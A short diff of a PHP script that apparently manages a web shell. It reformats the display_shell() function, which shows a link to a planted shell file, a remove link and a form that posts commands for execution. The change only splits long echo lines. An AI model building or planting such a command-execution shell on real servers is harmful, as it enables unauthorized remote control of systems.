@@ -66,8 +66,11 @@ function remove_directory($dir) {
 
 function display_shell($shell) {
     if (file_exists($shell)) {
-        echo "<p>shell at [<a href=\"$shell\">$shell</a>] (<a href=\"?remove=1\">remove</a>)</p>";
-        echo "<form action=\"$_SERVER[PHP_SELF]\" method=\"post\">Command: <input autofocus type=\"text\" name=\"cmd\" /><input type=\"submit\" value=\"Exec\" /></form>";
+        echo "<p>shell at [<a href=\"$shell\">$shell</a>]";
+        echo " (<a href=\"?remove=1\">remove</a>)</p>";
+        echo "<form action=\"$_SERVER[PHP_SELF]\" method=\"post\">";
+        echo "Command: <input autofocus type=\"text\" name=\"cmd\" />";
+        echo "<input type=\"submit\" value=\"Exec\" /></form>";
     }
     else {
 
